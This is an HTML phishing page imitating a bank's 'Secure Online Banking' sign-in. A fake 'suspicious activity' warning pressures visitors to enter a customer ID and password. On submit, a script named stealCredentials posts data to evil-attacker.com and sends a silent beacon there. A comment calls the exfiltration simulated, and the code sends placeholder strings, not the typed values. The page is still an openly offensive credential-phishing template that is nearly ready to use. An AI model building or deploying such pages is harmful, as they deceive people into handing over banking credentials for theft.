<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Secure Online Banking</title>

  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f1f5f9;
      margin: 0;
      padding: 0;
    }

    header {
      background: #1e3a8a;
      color: white;
      padding: 20px;
      text-align: center;
    }

    main {
      display: flex;
      justify-content: center;
      margin-top: 60px;
    }

    .login {
      background: white;
      width: 380px;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 15px 30px rgba(0,0,0,0.2);
    }

    .login h2 {
      margin-bottom: 10px;
      color: #1e3a8a;
    }

    .alert {
      color: #dc2626;
      font-weight: bold;
      font-size: 14px;
      margin-bottom: 15px;
    }

    input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border-radius: 5px;
      border: 1px solid #cbd5f5;
      font-size: 14px;
    }

    button {
      width: 100%;
      background: #1e3a8a;
      color: white;
      border: none;
      padding: 12px;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
    }

    button:hover {
      background: #172554;
    }

    footer {
      margin-top: 40px;
      text-align: center;
      font-size: 12px;
      color: #64748b;
    }
  </style>
</head>

<body>

<header>
  <h1>Secure Online Banking</h1>
</header>

<main>
  <div class="login">
    <h2>Sign in</h2>

    <p class="alert">
      ⚠ Suspicious activity detected on your account
    </p>

    <form onsubmit="stealCredentials(event)">
      <input type="text" placeholder="Customer ID" required />
      <input type="password" placeholder="Password" required />
      <button type="submit">Verify Account</button>
    </form>
  </div>
</main>

<footer>
  © 2026 Secure Banking Corporation
</footer>

<script>
  function stealCredentials(e) {
    e.preventDefault();

    // Simulated credential exfiltration
    fetch("https://evil-attacker.com/collect", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        session: "captured",
        timestamp: Date.now()
      })
    });

    // Silent beacon exfiltration
    navigator.sendBeacon(
      "https://evil-attacker.com/beacon",
      "credentials_exfiltrated"
    );
  }
</script>

</body>
</html>
